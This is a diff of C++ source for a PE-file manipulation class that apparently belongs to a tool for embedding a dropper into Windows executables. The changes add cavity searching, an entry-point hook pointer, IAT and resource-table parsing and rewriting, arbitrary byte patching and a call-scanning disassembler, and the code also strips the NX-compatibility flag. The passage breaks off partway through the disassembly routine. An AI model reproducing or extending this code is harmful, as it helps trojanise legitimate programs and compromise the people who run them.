@@ -3,23 +3,35 @@
 #include <iomanip>
 #include <iostream>
 #include <string>
+#include <sstream>
 using namespace std;
 
+#include <boost/foreach.hpp>
 #include "common.h"
 //#include <Wintrust.h>
 
-#include "DropperSection.h"
-#include "ResourceSection.h"
+#include "../libs/AsmJit/AsmJit.h"
+#include "../libs/BeaEngine/BeaEngine.h"
+
+#include "DropperObject.h"
+#include "Exceptions.h"
 #include "FileBuffer.h"
 #include "PEObject.h"
-#include "XRefNames.h"
+#include "ResourceDataEntry.h"
+#include "ResourceDirectory.h"
+#include "ResourceDirectoryEntry.h"
 #include "retcodes.h"
+#include "XRefNames.h"
+
+bool compareCavity(Cavity& a, Cavity& b) { return (a.size > b.size); }
+void printCavity(Cavity& a) { cout << "\t[0x" << hex << (DWORD) a.ptr << "] CAVITY @ 0x" << a.va << " [" << dec << a.size << " bytes]" << endl; }
 
 PEObject::PEObject(char* data, std::size_t size)
-: _rawData(data), _fileSize(size), _eofData(NULL), _sectionHeadersPadding(NULL), 
-	_hasManifest(false), _boundImportTable(NULL)
+: _rawData(data), _fileSize(size), _eofData(NULL), _sectionHeadersPadding(NULL), _boundImportTable(NULL)
 {
+	memset(&_resources, 0, sizeof(_resources));
 	memset(&functionIndex, 0, sizeof(functionIndex));
+	memset(&_hookPointer, 0, sizeof(_hookPointer));
 }
 
 PEObject::~PEObject(void)
@@ -31,7 +43,6 @@ PEObject::~PEObject(void)
 
 bool PEObject::parse()
 {
-	
 	assert(_rawData);
 	
 	cout << "Parsing PE." << endl;
@@ -42,25 +53,18 @@ bool PEObject::parse()
 	if (_parseNTHeader() == false)
 		return false;
 	
-	// ExitProcess
-	std::string kernel32dll("KERNEL32.DLL");
-	std::string exitProcess("EXITPROCESS");
-	functionIndex.ExitProcess = this->_findCall(kernel32dll, exitProcess); // _findExitProcessIndex();
-	cout << "ExitProcess @ " << functionIndex.ExitProcess << endl;
+	if (_parseIAT() == false)
+		return false;
 	
-	// exit
-	std::string msvCrtDll("MSVCRT.DLL");
-	std::string exit("EXIT");
-	functionIndex.exit = this->_findCall(msvCrtDll, exit); //_findExitIndex();
-	cout << "exit @ " << functionIndex.exit << endl;
+	try {
+		_parseResources();
+	} catch (parsing_error &e) {
+		cout << e.what() << endl;
+		return false;
+	}
 	
-	// _exit
-	std::string _exit("_EXIT");
-	functionIndex._exit = this->_findCall(msvCrtDll, _exit); // _find_exitIndex();
-	cout << "_exit @ " << functionIndex._exit << endl;
-
-	if ( ! _manifest.empty())
-		cout << "MANIFEST: " << endl << _manifest << endl;
+	if (_parseText() == false)
+		return false;
 	
 	return true;
 }
@@ -105,9 +109,10 @@ bool PEObject::isAuthenticodeSigned()
 }
 #endif
 
+
 bool PEObject::_parseNTHeader()
 {
-	_ntHeader = (IMAGE_NT_HEADERS*) _resolveOffset(_dosHeader.header->e_lfanew);
+	_ntHeader = (IMAGE_NT_HEADERS*) atOffset(_dosHeader.header->e_lfanew);
 	if (_ntHeader == NULL) {
 		cout << "Invalid PE header offset." << endl;
 		return false;
@@ -134,9 +139,6 @@ bool PEObject::_parseNTHeader()
 	if ( _ntHeader->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
 		_ntHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
 	
-	/*
-	// data directory
-	*/
 	// CHECK FOR BOUND IMPORT TABLE, IF PRESENT RESET IT
 	
 	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
@@ -150,10 +152,10 @@ bool PEObject::_parseNTHeader()
 	// sections
 	*/
 	cout << "File has " << _ntHeader->FileHeader.NumberOfSections << " sections" << endl;
-		
+	
 	IMAGE_SECTION_HEADER *sectionHeader  = NULL;
 	
-	sectionHeader = (IMAGE_SECTION_HEADER *)_resolveOffset(_dosHeader.header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+	sectionHeader = (IMAGE_SECTION_HEADER *)atOffset(_dosHeader.header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
 	if (sectionHeader == NULL)
 		return false;
 	
@@ -162,7 +164,7 @@ bool PEObject::_parseNTHeader()
 	for ( DWORD iC = 0; iC < _ntHeader->FileHeader.NumberOfSections ; iC++ )
 	{
 		// create a new section object
-		GenericSection* section = new GenericSection(*this, (char*)sectionHeader->Name, _ntHeader->OptionalHeader.FileAlignment, sectionHeader);
+		GenericSection* section = new GenericSection(*this, (char*)sectionHeader->Name, sectionHeader);
 		
 		// add section to list
 		_sections.push_back(section);
@@ -207,7 +209,10 @@ bool PEObject::_parseNTHeader()
 	
 	sectionHeader--;
 	if (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData < _fileSize) {
-		_eofData = new GenericSection(*this, ".EOF",  _ntHeader->OptionalHeader.FileAlignment);
+		
+		cout << "EOF data found." << endl; 
+		
+		_eofData = new GenericSection(*this, ".EOF");
 		_eofData->setEof(true);
 		_eofData->SetData(_rawData 
 			+ _sections[_sections.size() - 1]->PointerToRawData() 
@@ -221,21 +226,9 @@ bool PEObject::_parseNTHeader()
 	return true;
 }
 
+
 bool PEObject::saveToFile(std::string filename)
-{
-	/*
-	DWORD size = 0;
-	
-	if (_eofData) {
-		size = _eofData->header->PointerToRawData + _eofData->header->SizeOfRawData;
-	} else {
-		size = _sections[_sections.size() - 1]->PointerToRawData() + _sections[_sections.size() - 1]->SizeOfRawData();
-	}
-	
-	if (size <= 0)
-		return false;
-	*/
-	
+{	
 	try {
 		std::ofstream outfile(filename.c_str(), ios::out | ios::binary);
 		
@@ -307,19 +300,12 @@ bool PEObject::saveToFile(std::string filename)
 	return true;
 }
 
-DropperSection * PEObject::createDropperSection(string name)
-{
-	DropperSection* section = new DropperSection(*this, name, _ntHeader->OptionalHeader.FileAlignment);
-	appendSection(section);
-	
-	return section;
-}
 
-DWORD PEObject::_rvaToOffset( DWORD rva )
+DWORD PEObject::offset( DWORD rva )
 {
 	BOOL bFound = FALSE;
 	DWORD iC = 0;
-
+	
 	// TODO resolving offsets NOT IN SECTIONS will not work!!!
 	
 	for ( iC = 0; iC < _sections.size() ; iC++ )
@@ -339,92 +325,830 @@ DWORD PEObject::_rvaToOffset( DWORD rva )
 	return 0;
 }
 
+
 GenericSection* PEObject::getSection( DWORD directoryEntryID )
 {
-	std::vector<GenericSection *>::iterator iter = _sections.begin();
-	
 	DWORD rva = _ntHeader->OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress;
+	return findSection(rva);
+}
+
+
+IATEntry const & PEObject::getIATEntry( std::string const dll, std::string const call )
+{
+	IATEntries::iterator iter = _iat.begin();
 	
-	for (; iter != _sections.end(); iter++) 
+	for ( iter = _iat.begin(); iter != _iat.end(); iter++ )
 	{
+		DWORD addr = (*iter).first;
+		
+		IATEntry& entry = (*iter).second;
+		std::string aDll = entry.dll();
+		std::string aCall = entry.call();
+		std::transform(aDll.begin(), aDll.end(), aDll.begin(), tolower);
+		
+		if (!aDll.compare(dll) && !aCall.compare(call))
+			return entry;
+	}
+
+	throw IATEntryNotFound();
+}
+
+GenericSection* PEObject::findSection( DWORD rva )
+{
+	std::vector<GenericSection*>::iterator iter = _sections.begin();
+
+	for (; iter != _sections.end(); iter++) {
 		GenericSection* section = *iter;
-		if (section->VirtualAddress() == rva)
+		if (rva >= section->VirtualAddress()
+			&& rva < section->VirtualAddress() + section->SizeOfRawData())
 			return section;
 	}
-	
+
+	if (_eofData) 
+	{
+		if (rva >= _eofData->VirtualAddress() && rva < _eofData->VirtualAddress() + _eofData->SizeOfRawData()) {
+			return _eofData;
+		}
+	}
+
 	return NULL;
 }
 
-
-int PEObject::_findCall(std::string& dll, std::string& call)
+void PEObject::setSection( DWORD directoryEntryID, GenericSection* section )
 {
-	DWORD importTableRva = _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-	IMAGE_IMPORT_DESCRIPTOR * descriptor = (IMAGE_IMPORT_DESCRIPTOR*) (_rvaToOffset(importTableRva) + _rawData);
-	
-	while (descriptor->FirstThunk != 0) 
-	{
-		char * name = (char*) (_rvaToOffset(descriptor->Name) + _rawData);
-		cout << "Imported DLL: " << name << endl;
-		
-		// uppercase dllname
-		string dllName = name;
-		int (*pf)(int) = std::toupper;
-		std::transform(dllName.begin(), dllName.end(), dllName.begin(), pf);
-
-		if (dllName.compare(dll) != 0) {
-			descriptor++;
-			continue;
-		}
-		
-		UINT_PTR dwOriginalThunk = (descriptor->OriginalFirstThunk ? descriptor->OriginalFirstThunk : descriptor->FirstThunk);
-		IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(_rawData + _rvaToOffset(dwOriginalThunk));
-		UINT_PTR dwThunk = descriptor->FirstThunk;
-		DWORD Thunks = (DWORD) (_rvaToOffset(descriptor->OriginalFirstThunk != 0 ?
-			descriptor->OriginalFirstThunk : descriptor->FirstThunk) + (DWORD) _rawData);
-
-		int i = 0;
-		while (itd->u1.AddressOfData)
-		{
-			if (itd->u1.Ordinal & IMAGE_ORDINAL_FLAG) 
-			{
-				cout << "\tOrdinal: %08X\n" << itd->u1.Ordinal - IMAGE_ORDINAL_FLAG << endl;
-				itd++;
-				Thunks += sizeof(DWORD);
-				continue;
-			}
-
-			IMAGE_IMPORT_BY_NAME const * name = (IMAGE_IMPORT_BY_NAME const *) (_rvaToOffset( itd->u1.AddressOfData ) + _rawData);
-			cout << "\tName: " << (char*)(name->Name) << endl;
-
-			string callName = (char*) name->Name;
-			int (*pf)(int) = std::toupper;
-			transform(callName.begin(), callName.end(), callName.begin(), pf);
-
-			if (callName.compare(call) != 0) {
-				i++;
-				itd++;
-				Thunks += sizeof(DWORD);
-				continue;
-			}
-
-			return i;
-		}
-
-		return -1;
-	}
-
-	return -1;
+	setSection(directoryEntryID, section->VirtualAddress(), section->VirtualSize());
 }
 
-bool PEObject::init()
+void PEObject::setSection( DWORD directoryEntryID, DWORD VirtualAddress, DWORD VirtualSize)
 {
-	_sourceFile.open("input.bin", ios::in | ios::binary);
-	if (!_sourceFile.is_open())
+	_ntHeader->OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress = VirtualAddress;
+	_ntHeader->OptionalHeader.DataDirectory[directoryEntryID].Size = VirtualSize;
+}
+
+
+unsigned char* PEObject::GetOEPCode()
+{
+	DWORD oep = _ntHeader->OptionalHeader.AddressOfEntryPoint;
+	cout << "OEP " << hex << oep << " @ offset " << hex << offset(oep) << endl;
+	return (unsigned char*) _rawData + offset(oep);
+}
+
+
+void PEObject::writeData( DWORD rva, char * data, size_t size )
+{
+	char * ptr = _rawData + offset(rva);
+	memcpy(ptr, data, size);
+}
+
+bool PEObject::_parseResources()
+{
+	GenericSection* resSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
+	if (!resSection) // file has no resources
+		return true;
+	
+	//
+	// check if resource section is last one
+	//
+	if (resSection != _sections.back())
+		throw parsing_error("Resource section is not the last section in file.");
+	
+	try {
+		_resources.dir = _scanResources(resSection->data());
+	} catch (InvalidResourcesException& e) {
+		cout << e.what() << endl;
+		throw parsing_error(e.what());
+	}
+	
+	if (_resources.dir == NULL)
+		throw parsing_error("Resource section scan failed.");
+	
+	_resources.size = resSection->VirtualSize();
+	if (!_resources.size) {
+		_resources.dir = NULL;
+		throw parsing_error("Virtual size of resource section is zero.");
+	}
+	
+	cout << "*** Resources size: " << _resources.size << endl;
+	
+	return true;
+}
+
+ResourceDirectory* PEObject::_scanResources(char const * const data)
+{
+	if (!data)
+		return NULL;
+	
+	PRESOURCE_DIRECTORY rdRoot = PRESOURCE_DIRECTORY(data);
+	_resources.dir = _scanResources(rdRoot, rdRoot, 0);
+	
+	return _resources.dir;
+}
+
+ResourceDirectory* PEObject::_scanResources( PRESOURCE_DIRECTORY rdRoot, PRESOURCE_DIRECTORY rdToScan, DWORD level )
+{
+	PIMAGE_RESOURCE_DATA_ENTRY rde = NULL;
+	WCHAR* szName = NULL;
+
+	PIMAGE_RESOURCE_DIRECTORY resDir = PIMAGE_RESOURCE_DIRECTORY(rdToScan);
+
+#if 0
+	INDENT; cout << "Major Version    : " << hex << resDir->MajorVersion << endl;
+	INDENT; cout << "Minor Version    : " << hex << resDir->MinorVersion << endl;
+	INDENT; cout << "TimeDateStamp    : " << hex << resDir->TimeDateStamp << endl;
+	INDENT; cout << "Characteristics  : " << hex << resDir->Characteristics << endl;
+	INDENT; cout << "N. IdEntries     : " << hex << resDir->NumberOfIdEntries << endl;
+	INDENT; cout << "N. NamedEntries  : " << hex << resDir->NumberOfNamedEntries << endl;
+#endif
+
+	ResourceDirectory* rdc = new ResourceDirectory(resDir);
+	for (int i = 0; i < rdToScan->Header.NumberOfNamedEntries + rdToScan->Header.NumberOfIdEntries; i++)
+	{
+		if (rdToScan->Entries[i].NameIsString) {
+			PIMAGE_RESOURCE_DIR_STRING_U rds = 
+				PIMAGE_RESOURCE_DIR_STRING_U(rdToScan->Entries[i].NameOffset + (char*)rdRoot);
+
+			szName = new WCHAR[rds->Length + 1];
+			wmemcpy(szName, rds->NameString, rds->Length);
+			szName[rds->Length] = '\0';
+#if 0			
+			INDENT; INDENT; cout << "Name        : " << szName << endl;
+#endif		
+		} else {
+			szName = MAKEINTRESOURCEW(rdToScan->Entries[i].Id);
+
+#if 0
+			INDENT; INDENT; cout << "Name        : " << dec << (DWORD)szName << endl;
+			INDENT; INDENT; cout << "OffsetToData: " << hex << rdToScan->Entries[i].OffsetToData << endl;
+#endif
+		}
+
+		if (rdToScan->Entries[i].DataIsDirectory) {
+			// DIRECTORY ENTRY
+			rdc->AddEntry(
+				new ResourceDirectoryEntry(szName, 
+				_scanResources(
+				rdRoot, 
+				PRESOURCE_DIRECTORY(rdToScan->Entries[i].OffsetToDirectory + (PBYTE)rdRoot),
+				level + 1
+				)
+				)
+				);
+		} else {
+			// DATA ENTRY
+			
+			rde = PIMAGE_RESOURCE_DATA_ENTRY(rdToScan->Entries[i].OffsetToData + (PBYTE)rdRoot);
+			GenericSection* section = findSection(rde->OffsetToData);
+			
+#if 0
+			INDENT; INDENT; INDENT; cout << "OffsetToData: " << hex << rde->OffsetToData << endl;
+			INDENT; INDENT; INDENT; cout << "Size        : " << dec << rde->Size << endl;
+			INDENT; INDENT; INDENT; cout << "Codepage    : " << hex << rde->CodePage << endl;
+			INDENT; INDENT; INDENT; cout << "Reserved    : " << hex << rde->Reserved << endl;
+#endif
+			
+			ResourceDataEntry * newRde = NULL;
+			
+			if (section) {
+				PBYTE data = (PBYTE)section->data() + rde->OffsetToData - section->VirtualAddress();
+				newRde = new ResourceDataEntry(
+					data,
+					rde->OffsetToData,
+					rde->Size,
+					rde->CodePage);
+				
+				if ( section == getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE) ) {
+					newRde->SetAdded(true);
+					newRde->SetData(data, rde->Size);
+					// cout << "Resource data is in RESOURCE section." << endl;
+				} else {
+					// cout << "Resource data is outside RESOURCE section." << endl;
+				}
+			
+			} else {
+				cout << "NO SECTION FOUND FOR RESOURCE" << endl;
+				newRde = new ResourceDataEntry(
+					rde->OffsetToData,
+					rde->Size,
+					rde->CodePage);
+			}
+			
+			rdc->AddEntry(
+				new ResourceDirectoryEntry(
+				szName,
+				newRde
+				)
+				);
+		}
+		
+		if (!IS_INTRESOURCE(szName))
+			delete [] szName;
+	}
+
+	return rdc;
+}
+
+bool PEObject::_updateResource( WCHAR* type, WCHAR* name, LANGID lang, PBYTE data, DWORD size )
+{
+	ResourceDirectory* nameDir = NULL;
+	ResourceDirectory* langDir = NULL;
+	ResourceDataEntry* dataEntry = NULL;
+	IMAGE_RESOURCE_DIRECTORY rd = {0, /* time(0), */};
+	int typeIdx = -1, nameIdx = -1, langIdx = -1;
+
+	typeIdx = _resources.dir->Find(type);
+	if (typeIdx > -1) {
+		nameDir = _resources.dir->GetEntry(typeIdx)->GetSubDirectory();
+		nameIdx = nameDir->Find(name);
+		if (nameIdx > -1) {
+			langDir = nameDir->GetEntry(nameIdx)->GetSubDirectory();
+			langIdx = langDir->Find(lang);
+			if (langIdx > -1) {
+				dataEntry = langDir->GetEntry(langIdx)->GetDataEntry();
+			}
+		}
+	}
+
+	if (data) {
+		// replace/add resource
+		if (dataEntry) {
+			dataEntry->SetAdded(true);
+			dataEntry->SetData(data, size);
+			return true;
+		}
+
+		if (!nameDir) {
+			nameDir = new ResourceDirectory(&rd);
+			_resources.dir->AddEntry(new ResourceDirectoryEntry(type, nameDir));
+		}
+		if (!langDir) {
+			langDir = new ResourceDirectory(&rd);
+			nameDir->AddEntry(new ResourceDirectoryEntry(name, langDir));
+		}
+		if (!dataEntry) {
+			dataEntry = new ResourceDataEntry(data, 0, size);
+			dataEntry->SetAdded(true);
+			langDir->AddEntry(new ResourceDirectoryEntry(MAKEINTRESOURCEW(lang), dataEntry));
+		}
+	} else 
 		return false;
 
-	_destinationFile.open("output.bin", ios::out | ios::binary | ios::trunc);
-	if (!_destinationFile.is_open())
-		return false;
+	return true;
+}
 
+std::size_t PEObject::writeResources( char* data, DWORD virtualAddress )
+{
+	DWORD level = 0;
+	
+	char* buffer = data;
+	PBYTE ptr = (PBYTE)buffer;
+	
+	cout << __FUNCTION__ << endl;
+	
+	// cout << "[1] seeker base at 0x" << hex << (DWORD)seeker << endl;
+	
+	queue<ResourceDirectory*> dirs;
+	queue<ResourceDataEntry*> dataEntries;
+	queue<ResourceDataEntry*> dataEntries2;
+	queue<ResourceDirectoryEntry*> strings;
+	
+	dirs.push(_resources.dir);
+	
+	// IMAGE_RESOURCE_DIRECTORY
+	while (!dirs.empty()) 
+	{
+		// take first dir
+		ResourceDirectory* crd = dirs.front();
+
+		// WRITE THE HEADER
+		IMAGE_RESOURCE_DIRECTORY rdDir = crd->GetInfo();
+
+		//INDENT; cout << "IMAGE_RESOURCE_DIR: " << endl;
+		//INDENT; cout << "Major Version    : " << hex << rdDir.MajorVersion << endl;
+		//INDENT; cout << "Minor Version    : " << hex << rdDir.MinorVersion << endl;
+		//INDENT; cout << "TimeDateStamp    : " << hex << rdDir.TimeDateStamp << endl;
+		//INDENT; cout << "Characteristics  : " << hex << rdDir.Characteristics << endl;
+		//INDENT; cout << "N. IdEntries     : " << hex << rdDir.NumberOfIdEntries << endl;
+		//INDENT; cout << "N. NamedEntries  : " << hex << rdDir.NumberOfNamedEntries << endl;
+
+		memcpy(ptr, &rdDir, sizeof(IMAGE_RESOURCE_DIRECTORY));
+		crd->writtenAt = DWORD(ptr);
+		ptr += sizeof(IMAGE_RESOURCE_DIRECTORY);
+
+		//cout << "[2] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(IMAGE_RESOURCE_DIRECTORY) << endl;
+
+		// for each entry in directory
+		for (int i = 0; i < crd->CountEntries(); i++)
+		{
+			// if it has name, we add the string
+			if (crd->GetEntry(i)->HasName())
+				strings.push(crd->GetEntry(i));
+
+			// if it's a directory, add the dir to queue
+			if (crd->GetEntry(i)->IsDataDirectory())
+				dirs.push(crd->GetEntry(i)->GetSubDirectory());
+			else
+			{
+				ResourceDataEntry* dataEntry = crd->GetEntry(i)->GetDataEntry();
+				if (dataEntry) {
+					// add to queue for header writing
+					dataEntries.push(dataEntry);
+
+					// add to queue only raw data entries, RVA are already present in PE
+					if (dataEntry->IsAdded()) {
+						dataEntries2.push(dataEntry);
+					}
+				}
+			}
+
+			// WRITE EACH ENTRY
+			PIMAGE_RESOURCE_DIRECTORY_ENTRY rDirE = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)ptr;
+			memset(rDirE, 0, sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
+			rDirE->DataIsDirectory = crd->GetEntry(i)->IsDataDirectory();
+			rDirE->Id = (crd->GetEntry(i)->HasName()) ? 0 : crd->GetEntry(i)->GetId();
+			rDirE->NameIsString = (crd->GetEntry(i)->HasName()) ? 1 : 0;
+
+			// CopyMemory(seeker, &rDirE, sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
+			crd->GetEntry(i)->writtenAt = DWORD(ptr);
+			ptr += sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);
+
+			//INDENT; cout << "Name        : " << hex << rDirE->Name << endl;
+			//INDENT; cout << "OffsetToData: " << hex << rDirE->OffsetToData << endl;
+
+			//cout << "[3] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) << endl;
+		}
+
+		// remove dir just processed
+		dirs.pop();
+	}
+
+	// IMAGE_RESOURCE_DATA_ENTRY
+	while (!dataEntries.empty())
+	{
+		// WRITE DATA ENTRY
+		ResourceDataEntry* cRDataE = dataEntries.front();
+		PIMAGE_RESOURCE_DATA_ENTRY rDataE = (PIMAGE_RESOURCE_DATA_ENTRY) ptr;
+		memset(rDataE, 0, sizeof(IMAGE_RESOURCE_DATA_ENTRY));
+		rDataE->OffsetToData = cRDataE->GetRva();
+		rDataE->CodePage = cRDataE->GetCodePage();
+		rDataE->Size = cRDataE->GetSize();
+
+		// CopyMemory(seeker, &rDataE, sizeof(IMAGE_RESOURCE_DATA_ENTRY));
+		cRDataE->writtenAt = DWORD(ptr);
+		ptr += sizeof(IMAGE_RESOURCE_DATA_ENTRY);
+
+		//INDENT; cout << "RESOURCE_DATA_ENTRY" << endl;
+		//INDENT; cout << "OffsetToData: " << hex << rDataE->OffsetToData << endl;
+		//INDENT; cout << "Size        : " << rDataE->Size << endl;
+		//INDENT; cout << "Codepage    : " << hex << rDataE->CodePage << endl;
+		//INDENT; cout << "Reserved    : " << rDataE->Reserved << endl;
+
+		// cout << "[4] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(IMAGE_RESOURCE_DATA_ENTRY) << endl;
+
+		dataEntries.pop();
+	}
+
+	// STRINGS
+	while (!strings.empty()) 
+	{
+		ResourceDirectoryEntry* cRDirE = strings.front();
+
+		PIMAGE_RESOURCE_DIRECTORY_ENTRY(cRDirE->writtenAt)->NameOffset = DWORD(ptr) - DWORD(buffer);
+		
+		WCHAR* szName = cRDirE->GetName();
+		WORD iLen = wcslen(szName) + 1;
+
+		*(WORD*)ptr = iLen - 1;
+		ptr += sizeof(WORD);
+		wmemcpy((WCHAR*)ptr, szName, iLen);
+		ptr += iLen * sizeof(WCHAR);
+
+		//cout << "[5] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << iLen * sizeof(WCHAR) << endl;
+		//cout << "[6] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(WORD) << endl;
+
+		delete [] szName;
+
+		strings.pop();
+	}
+
+	// RAW DATA
+	while (!dataEntries2.empty()) {
+		ResourceDataEntry* cRDataE = dataEntries2.front();
+		PCHAR data = (PCHAR)cRDataE->GetData();
+		
+		if (data != NULL)
+		{
+			DWORD size = cRDataE->GetSize();
+			memcpy(ptr, data, size);
+			PIMAGE_RESOURCE_DATA_ENTRY dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)cRDataE->writtenAt;
+			dataEntry->OffsetToData = ( (DWORD)ptr - (DWORD)buffer ) + virtualAddress;
+			
+			cout << "RSRC written " << dec << size << " bytes at offset 0x" << hex << dataEntry->OffsetToData << endl;
+			//cout << "[7] seeker @ 0x" << hex << (DWORD)seeker;
+			
+			DWORD increment = RALIGN(cRDataE->GetSize(), 8);
+			ptr += increment;
+
+			//cout << " incremented by " << dec << increment << " for size " << dec << size << endl;
+		}
+		
+		dataEntries2.pop();
+	}
+	
+	_resources.size = (DWORD)ptr - (DWORD)buffer;
+	
+	cout << "*** written resource size " << dec << _resources.size << endl;
+
+	_setResourceOffsets(_resources.dir, DWORD(buffer));
+	
+	return _resources.size;
+}
+
+DWORD PEObject::_sizeOfResources()
+{
+	DWORD size = 0;
+
+	queue<ResourceDirectory*> dirs;
+	queue<ResourceDataEntry*> dataEntries;
+	queue<ResourceDataEntry*> dataEntries2;
+	queue<ResourceDirectoryEntry*> strings;
+	
+	dirs.push(_resources.dir);
+	
+	// IMAGE_RESOURCE_DIRECTORY
+	while (!dirs.empty()) 
+	{
+		size += sizeof(IMAGE_RESOURCE_DIRECTORY);
+		
+		ResourceDirectory* crd = dirs.front();
+		for (int i = 0; i < crd->CountEntries(); i ++)
+		{
+			// if it has name, we add the string
+			if (crd->GetEntry(i)->HasName())
+				strings.push(crd->GetEntry(i));
+			
+			// if it's a directory, add the dir to queue
+			if (crd->GetEntry(i)->IsDataDirectory())
+				dirs.push(crd->GetEntry(i)->GetSubDirectory());
+			else 
+			{
+				ResourceDataEntry* dataEntry = crd->GetEntry(i)->GetDataEntry();
+				if (dataEntry) {
+					// if it's a data entry, add it to both data queues
+					dataEntries.push(dataEntry);
+
+					// add to queue only raw data entries, RVA are already present in PE
+					if (dataEntry->GetData() != NULL)
+						dataEntries2.push(dataEntry);
+				}
+			}
+			size += sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);
+		}
+		dirs.pop();
+	}
+
+	// IMAGE_RESOURCE_DATA_ENTRY
+	while (!dataEntries.empty())
+	{	
+		size += sizeof(IMAGE_RESOURCE_DATA_ENTRY);
+		dataEntries.pop();
+	}
+
+	// STRINGS
+	while (!strings.empty()) 
+	{
+		ResourceDirectoryEntry* cRDirE = strings.front();
+
+		WCHAR* szName = cRDirE->GetName();
+		WORD iLen = wcslen(szName);
+
+		size += sizeof(WORD);
+		size += iLen * sizeof(WCHAR);
+		size += sizeof(WORD);
+
+		strings.pop();
+	}
+
+	// RAW DATA
+	while (!dataEntries2.empty()) {
+		ResourceDataEntry* cRDataE = dataEntries2.front();
+		DWORD increment = RALIGN(cRDataE->GetSize(), 8);
+		size += increment;
+
+		dataEntries2.pop();
+	}
+
+	return size;
+}
+
+void PEObject::_setResourceOffsets( ResourceDirectory* resDir, DWORD newResDirAt )
+{
+	for (int i = 0; i < resDir->CountEntries(); i++) {
+		PIMAGE_RESOURCE_DIRECTORY_ENTRY dirEntry = PIMAGE_RESOURCE_DIRECTORY_ENTRY(resDir->GetEntry(i)->writtenAt);
+		if (resDir->GetEntry(i)->IsDataDirectory()) {
+			dirEntry->DataIsDirectory = 1;
+			dirEntry->OffsetToDirectory = resDir->GetEntry(i)->GetSubDirectory()->writtenAt - newResDirAt;
+			_setResourceOffsets(resDir->GetEntry(i)->GetSubDirectory(), newResDirAt);
+		}
+		else {
+			ResourceDataEntry* dataEntry = resDir->GetEntry(i)->GetDataEntry();
+			if (dataEntry)
+				dirEntry->OffsetToData = dataEntry->writtenAt - newResDirAt;
+		}
+	}
+}
+
+bool PEObject::_parseIAT()
+{
+	DWORD rva = dataDirectory(IMAGE_DIRECTORY_ENTRY_IMPORT)->VirtualAddress;
+	DWORD size = dataDirectory(IMAGE_DIRECTORY_ENTRY_IMPORT)->Size;
+	
+	if (!rva)
+		return false;
+	
+	PIMAGE_IMPORT_DESCRIPTOR iat = (PIMAGE_IMPORT_DESCRIPTOR) atRVA(rva);
+	while (iat->Name) {
+		string dll = (PCHAR) atRVA(iat->Name);
+		
+		DWORD* thunk = (DWORD*) atRVA(iat->OriginalFirstThunk != 0 ? iat->OriginalFirstThunk : iat->FirstThunk);
+		INT idx = 0;
+		while (thunk[idx]) {
+			DWORD rva = imageBase() + iat->FirstThunk + (idx * sizeof(DWORD));
+			ostringstream call;
+			
+			if (thunk[idx] & IMAGE_ORDINAL_FLAG) 
+			{
+				call << dec << thunk[idx] - IMAGE_ORDINAL_FLAG;
+				rva &= ~IMAGE_ORDINAL_FLAG;
+			}
+			else
+			{
+				PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME) atRVA(thunk[idx]);
+				call << (char*)name->Name;
+			}
+			
+			IATEntry entry(dll, call.str(), idx);
+			_iat.insert( make_pair( rva, entry ) );
+			
+			idx++;
+		}
+		
+		iat++;
+	}
+	
+	IATEntries::iterator iter = _iat.begin();
+	for ( iter = _iat.begin(); iter != _iat.end(); iter++ )
+	{
+		DWORD addr = (*iter).first;
+		IATEntry const & entry = getIATEntry(addr);	
+		cout << "0x" << hex << addr << " " << IATEntry::str(entry) << " @" << entry.index() << endl;
+	}
+	
+	return true;
+}
+
+IATEntry const & PEObject::getIATEntry( DWORD const rva )
+{
+	IATEntries::iterator entry = _iat.find(rva);
+	if (entry != _iat.end())
+		return (*entry).second;
+	else
+		throw IATEntryNotFound("No such entry.");
+}
+
+void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsigned char* ep, int VA)
+{
+	DISASM _disasm;
+	
+	_disasm.EIP = (long long) ep;
+	_disasm.VirtualAddr = (long long) VA;
+	_disasm.Archi = 0;
+	_disasm.Options = MasmSyntax | NoTabulation | SuffixedNumeral | ShowSegmentRegs;
+	
+	_disasm.SecurityBlock = end - start;
+	long long startVA = VA - ((long) ep - (long) start);
+	long long endVA = startVA + ((long) end - (long) start);
+	
+	cout << "Disassembling 0x" << hex << startVA << " -> 0x" << hex << endVA << endl;
+	
+	/* ============================= Loop for Disasm */
+	while (1) {
+		int len = Disasm(&_disasm);
+		if ((len != OUT_OF_BLOCK) && (len != UNKNOWN_OPCODE)) {
+#if 0
+			if ((_disasm.Instruction.BranchType == JmpType) && (_disasm.Instruction.AddrValue != 0))
+			{
+				printf(" --> following jmp to 0x%08x\n", _disasm.Instruction.AddrValue);
+				_disasm.EIP = (DWORD) atRVA((int) _disasm.Instruction.AddrValue - imageBase());
+				_disasm.VirtualAddr = _disasm.Instruction.AddrValue;
+			} else
+#endif
+			if ((_disasm.Instruction.BranchType == CallType))
+			{
+				std::size_t va = 0;
+				
+				if (_disasm.Instruction.AddrValue)
+					va = _disasm.Instruction.AddrValue;
